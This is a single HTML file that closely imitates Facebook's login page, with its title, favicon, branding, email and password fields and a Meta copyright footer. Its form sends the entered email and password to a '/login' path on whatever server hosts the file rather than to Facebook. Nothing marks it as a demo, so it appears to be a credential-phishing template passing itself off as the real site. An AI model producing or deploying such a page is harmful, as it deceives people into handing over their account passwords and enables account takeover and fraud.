<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Facebook - log in or sign up</title>
<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeInUp{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes slideLeft{from{opacity:0;transform:translateX(-40px)}to{opacity:1;transform:translateX(0)}}
@keyframes slideRight{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
@keyframes gradientBG{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
body{font-family:Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#f0f2f5,#e4e6eb,#f0f2f5);background-size:200% 200%;animation:gradientBG 8s ease infinite;min-height:100vh;display:flex;flex-direction:column}
.main{display:flex;align-items:center;justify-content:center;flex:1;padding:40px 20px;gap:60px;max-width:1000px;margin:0 auto;width:100%}
.left{flex:1;max-width:500px;animation:slideLeft 0.8s cubic-bezier(0.16,1,0.3,1)}
.left h2{font-size:56px;color:#1877f2;font-weight:700;line-height:1.1;margin-bottom:16px;text-shadow:0 2px 4px rgba(24,119,242,0.1)}
.left p{font-size:26px;color:#1c1e21;line-height:1.3}
.right{width:396px;animation:slideRight 0.8s cubic-bezier(0.16,1,0.3,1) 0.2s both}
.login-card{background:white;padding:24px;border-radius:12px;box-shadow:0 8px 40px rgba(0,0,0,0.12);transition:transform 0.3s,box-shadow 0.3s}
.login-card:hover{transform:translateY(-4px);box-shadow:0 12px 50px rgba(0,0,0,0.15)}
.login-card input{width:100%;padding:16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:8px;font-size:17px;outline:none;transition:all 0.3s}
.login-card input:focus{border-color:#1877f2;box-shadow:0 0 0 3px rgba(24,119,242,0.15)}
.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,#1877f2,#0d65d9);color:white;border:none;border-radius:8px;font-size:20px;font-weight:700;cursor:pointer;transition:all 0.3s;position:relative;overflow:hidden}
.login-btn:hover{background:linear-gradient(135deg,#166fe5,#0b5cc7);box-shadow:0 4px 15px rgba(24,119,242,0.4);transform:translateY(-2px)}
.login-btn:active{transform:translateY(0)}
.forgot{text-align:center;display:block;color:#1877f2;font-size:14px;text-decoration:none;margin:16px 0;transition:color 0.2s}
.forgot:hover{text-decoration:underline;color:#0d5bbf}
.divider{border-top:1px solid #dadde1;margin:20px 0}
.create-btn{display:block;margin:0 auto;padding:14px 24px;background:linear-gradient(135deg,#42b72a,#36a420);color:white;border:none;border-radius:8px;font-size:17px;font-weight:700;cursor:pointer;transition:all 0.3s}
.create-btn:hover{box-shadow:0 4px 15px rgba(66,183,42,0.4);transform:translateY(-2px)}
.page-link{text-align:center;margin-top:28px;font-size:14px;color:#1c1e21;animation:fadeIn 0.6s ease 0.6s both}
.page-link a{color:#1877f2;text-decoration:none;font-weight:600}
.footer{background:white;padding:20px;text-align:center;font-size:12px;color:#737373;border-top:1px solid #dadde1;animation:fadeIn 0.6s ease 0.8s both}
@media(max-width:768px){.main{flex-direction:column;gap:20px;text-align:center}.left h2{font-size:36px}.left p{font-size:18px}.right{width:100%;max-width:396px}}
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <h2>facebook</h2>
        <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
    <div class="right">
        <div class="login-card">
            <form action="/login" method="POST">
                <input type="text" name="email" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <button class="create-btn">Create new account</button>
        </div>
        <p class="page-link"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
    </div>
</div>
<div class="footer">English (UK) · Français · Español · हिन्दी · العربية<br>Meta © 2024</div>
</body>
</html>
